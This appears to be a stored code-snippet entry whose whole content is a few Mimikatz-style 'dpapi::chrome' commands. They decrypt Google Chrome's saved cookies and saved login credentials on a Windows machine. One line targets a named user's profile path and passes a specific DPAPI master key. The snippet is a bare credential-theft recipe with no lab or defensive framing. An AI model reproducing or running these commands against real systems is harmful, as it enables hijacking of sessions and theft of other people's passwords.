---
id: 1c3d0caf-bdba-40c0-8526-993afbd85eab
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:27.512648+00:00'
updated_at: '2023-04-10T20:37:19.525805+00:00'
---

# Code Snippet 1c3d0caf

**Language**: Powershell

```powershell
# Saved Cookies
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b

# Saved Credential in Chrome
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```
